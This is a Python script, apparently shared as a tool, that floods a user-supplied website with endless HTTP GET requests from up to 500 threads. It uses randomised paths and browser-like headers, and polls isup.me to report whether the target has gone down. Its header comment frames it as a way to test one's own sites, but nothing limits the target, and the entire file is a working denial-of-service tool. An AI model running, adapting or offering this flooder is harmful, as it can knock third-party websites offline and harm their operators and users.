# -*- coding: utf-8 -*-
# Script created for testing your own websites
# by Alexey Privalov | www.alex0007.ru
import socket
import threading
import urllib.request
import time
import random
import sys
import string

# Global parameters
thread_limit = 500  # Number of threads
user_agent = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1734.5 Safari/537.36"
# Global parameters end


class Flooder(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        try:
            sock = socket.socket()
            if sock.connect_ex((ip, 80)) != 0:
                raise Exception("Connect Error")
            sock.settimeout(30)
            sock.setblocking(0)
            while True:
                randstr = '/' + ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
                q1 = str(round(random.uniform(0.5, 0.7), 1))
                q2 = str(round(random.uniform(0.7, 1), 1))
                cur_header = {
                    "Host": " " + str(target.netloc),
                    "Content-type": "application/x-www-form-urlencoded",
                    "Accept": "text/plain; q=" + q1 + ", text/html, "
                                                      "text/x-dvi; q=" + q2 + "; mxb=100000, text/x-c",
                    "Keep-Alive": "300",
                    "Connection": "Keep-Alive",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache",
                    "User-agent": user_agent,
                    "Accept-Encoding": "gzip,deflate"
                }
                sock.sendall(str.encode(
                    "GET " + randstr + target.path + " HTTP/1.1\r\nHost: " + target.netloc + "\r\n" + str(
                        cur_header) + "\r\n\r\n\r\n"))

        except:
            sock.close()
            sys.exit()
            pass


class Checker(threading.Thread):
    current_sec = None

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        while True:
            if time.localtime().tm_sec % 15 == 0 and self.current_sec != time.localtime().tm_sec:
                self.current_sec = time.localtime().tm_sec
                try:
                    req = urllib.request.Request("http://isup.me/" + target.netloc + target.path)
                    if urllib.request.urlopen(req).read().decode().find("It's just you") > 0:
                        status = "up"
                    else:
                        status = "down"
                    print("The website is", status)
                except:
                    print("Can't check website status")

#  some input url preparations
if len(sys.argv) == 2:
    target = sys.argv[1]
else:
    print('Enter target url or IP ( e.g. "http://google.com" or "http://195.208.0.133"):')
    target = input()

target = urllib.parse.urlparse(target)
if target.netloc.__len__() == 0:
    print("Incorrect url input")
    sys.exit()
if str(target.path).__len__() == 0:
    str_target = target.scheme + "://" + target.netloc + target.path + "/"
    target = urllib.parse.urlparse(str_target)
str_target = target.scheme + "://" + target.netloc + target.path
# preparations ended

#  getting IP
try:
    ip = socket.getaddrinfo(target.netloc, 80)[0][4][0]
    print(ip)
except:
    print("Can't get ip")
    sys.exit()
#  end IP getting

print("Flooding %s" % str_target)
Checker().start()
while True:
    if threading.active_count() <= thread_limit:
        Flooder().start()
